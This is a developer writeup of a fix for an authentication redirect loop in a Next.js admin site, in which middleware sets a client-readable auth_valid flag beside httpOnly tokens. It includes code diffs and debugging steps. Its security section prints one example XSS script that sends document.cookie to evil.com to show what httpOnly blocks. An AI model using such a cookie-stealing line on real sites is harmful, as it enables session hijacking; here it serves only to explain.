# HttpOnly Cookies Fix

## The Problem Explained

Your auth cookies have the **`httpOnly`** flag set to `true`, which means:
- ✅ They're sent automatically with HTTP requests (secure!)
- ✅ Server-side code (middleware, server components) can read them
- ❌ JavaScript cannot access them via `document.cookie` (security feature)

This caused a redirect loop because client-side code couldn't verify authentication.

## The Solution

We implemented a **three-layer approach**:

### 1. **Middleware** (Server-side - Primary Auth Check)
```typescript
// middleware.ts
if (idToken || accessToken) {
  // Set a non-httpOnly flag cookie that client-side can read
  response.cookies.set('auth_valid', '1', {
    httpOnly: false, // Client can read this
    domain: '.brmh.in',
    secure: true
  });
}
```

### 2. **RequireAuth Component** (Client-side - User Profile)
```typescript
// components/auth/RequireAuth.tsx
// No longer checks authentication (middleware already did)
// Just fetches user profile using credentials: 'include'
fetch(`${BACKEND}/auth/profile`, {
  credentials: 'include', // Sends httpOnly cookies automatically
})
```

### 3. **SSOUtils** (Utility - Mixed)
```typescript
// lib/sso-utils.ts
static isAuthenticated(): boolean {
  const cookies = this.getCookies();
  // Check for auth_valid flag (set by middleware)
  return !!(cookies.auth_valid || cookies.access_token || cookies.id_token);
}
```

## How It Works Now

```
┌─────────────────────────────────────────────────────────────┐
│              User visits admin.brmh.in                      │
└───────────────────────┬─────────────────────────────────────┘
                        │
                        ▼
        ┌───────────────────────────────┐
        │    Middleware (server-side)   │
        │  Can read httpOnly cookies    │
        └───────────┬───────────────────┘
                    │
            ┌───────┴────────┐
            │                │
     Has tokens?      No tokens?
            │                │
            ▼                ▼
    ┌──────────────┐  ┌───────────────┐
    │ Set flag:    │  │ Redirect to   │
    │ auth_valid=1 │  │ auth.brmh.in  │
    └──────┬───────┘  └───────────────┘
           │
           ▼
    ┌──────────────────────┐
    │  Page loads          │
    │  (client-side)       │
    └──────┬───────────────┘
           │
           ▼
    ┌──────────────────────┐
    │  RequireAuth checks  │
    │  auth_valid flag     │
    │  (can read this!)    │
    └──────┬───────────────┘
           │
           ▼
    ┌──────────────────────┐
    │  Fetch user profile  │
    │  with credentials    │
    │  (httpOnly cookies   │
    │   sent automatically)│
    └──────┬───────────────┘
           │
           ▼
    ┌──────────────────────┐
    │  Dashboard loads ✅  │
    └──────────────────────┘
```

## What Changed

### File 1: `middleware.ts`
**Added:** Sets `auth_valid` flag cookie (non-httpOnly) when user is authenticated
```diff
+ // Set a client-readable flag so client-side knows auth is valid
+ response.cookies.set('auth_valid', '1', {
+   httpOnly: false, // Client can read this
+   domain: '.brmh.in'
+ });
```

### File 2: `components/auth/RequireAuth.tsx`
**Removed:** Client-side authentication checks (can't read httpOnly cookies)
**Kept:** User profile fetching with `credentials: 'include'`
```diff
- // Check if authenticated via cookies
- if (!SSOUtils.isAuthenticated()) {
-   window.location.href = 'https://auth.brmh.in/login';
- }
+ // NOTE: Authentication already handled by middleware
+ // Just fetch user profile (httpOnly cookies sent automatically)
```

### File 3: `lib/sso-utils.ts`
**Updated:** Check `auth_valid` flag instead of trying to read httpOnly cookies
```diff
  static isAuthenticated(): boolean {
-   return !!(cookies.access_token || cookies.id_token);
+   // Check for auth_valid flag (set by middleware) 
+   // or direct tokens (if not httpOnly)
+   return !!(cookies.auth_valid || cookies.access_token || cookies.id_token);
  }
```

## Testing The Fix

### Step 1: Clear Everything
```bash
# Open DevTools (F12)
# Application → Cookies → Clear all
# Application → Local Storage → Clear all
```

### Step 2: Test Login Flow
```bash
1. Go to: https://admin.brmh.in
2. Should redirect to: https://auth.brmh.in/login
3. Login with credentials
4. Should redirect back to: https://admin.brmh.in/dashboard
5. ✅ Dashboard should load WITHOUT infinite redirect
```

### Step 3: Verify Cookies
```bash
# Open DevTools → Application → Cookies → admin.brmh.in
# Should see:
✅ id_token (httpOnly: true, secure: true)
✅ access_token (httpOnly: true, secure: true)
✅ refresh_token (httpOnly: true, secure: true)
✅ auth_valid (httpOnly: false, secure: true) ← NEW!
```

### Step 4: Verify Auth Works
```javascript
// Paste in browser console:
console.log('Auth valid flag:', document.cookie.includes('auth_valid=1'))
// Should show: Auth valid flag: true

// httpOnly cookies won't show (expected):
console.log('Can see id_token:', document.cookie.includes('id_token'))
// Should show: Can see id_token: false (because it's httpOnly)
```

## Why HttpOnly Cookies Are Good

HttpOnly cookies **prevent XSS attacks**:
```javascript
// If an attacker injects malicious code:
<script>
  // This WON'T work (httpOnly protection):
  fetch('evil.com/steal?token=' + document.cookie)
  
  // But the browser still sends httpOnly cookies 
  // to legitimate requests automatically
</script>
```

## Debug Commands

### Check if auth_valid flag is set:
```javascript
document.cookie.split(';').find(c => c.trim().startsWith('auth_valid'))
// Should return: "auth_valid=1"
```

### Check if authentication is working:
```javascript
// Test API call with httpOnly cookies
fetch('https://brmh.in/auth/profile', {
  credentials: 'include' // Sends httpOnly cookies
})
.then(r => r.json())
.then(data => console.log('Profile:', data))
.catch(err => console.error('Error:', err))
```

### Force re-authentication:
```javascript
// Clear all cookies
['id_token', 'access_token', 'refresh_token', 'auth_valid'].forEach(key => {
  document.cookie = `${key}=; domain=.brmh.in; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT`
})

// Reload page
window.location.reload()
```

## Common Issues

### Issue: Still getting infinite redirect
**Cause:** Old cookies or cached state
**Solution:**
```bash
1. Clear all cookies AND local storage
2. Close ALL browser tabs for *.brmh.in
3. Clear browser cache
4. Restart browser
5. Try login flow again
```

### Issue: auth_valid flag not being set
**Cause:** Middleware not running or cookies not readable
**Solution:**
```bash
1. Check middleware.ts has the updated code
2. Rebuild Next.js: npm run build
3. Restart dev server: npm run dev
4. Check server logs for [Inkhub Middleware] messages
```

### Issue: User profile not loading
**Cause:** Backend not receiving httpOnly cookies
**Solution:**
```bash
1. Verify credentials: 'include' in fetch calls
2. Check CORS settings allow credentials
3. Verify backend URL is correct
4. Check Network tab for /auth/profile request
```

## Architecture Overview

### Layer 1: Middleware (Server-side)
- **Can read:** httpOnly cookies ✅
- **Sets:** `auth_valid` flag cookie
- **Purpose:** Primary authentication gate

### Layer 2: Server Components (Server-side)
- **Can read:** httpOnly cookies ✅
- **Purpose:** Check auth for server-rendered pages

### Layer 3: Client Components (Client-side)
- **Can read:** `auth_valid` flag ✅
- **Cannot read:** httpOnly cookies ❌ (security feature)
- **Purpose:** Fetch user data, UI state

### Layer 4: API Calls (Client-side)
- **Sends:** httpOnly cookies automatically (with `credentials: 'include'`)
- **Purpose:** Authenticated API requests

## Security Benefits

This approach provides **defense in depth**:

1. ✅ **XSS Protection:** Tokens can't be stolen via JavaScript
2. ✅ **CSRF Protection:** SameSite=Lax prevents cross-site requests
3. ✅ **Secure Transport:** Secure flag requires HTTPS
4. ✅ **Minimal Exposure:** Only `auth_valid` flag is client-readable (not the actual token)

## Summary

**Problem:** Client-side code couldn't read httpOnly cookies → infinite redirect loop
**Solution:** Middleware sets a readable `auth_valid` flag when httpOnly cookies are present
**Result:** Client knows user is authenticated without exposing actual tokens

This maintains security while enabling proper client-side functionality.

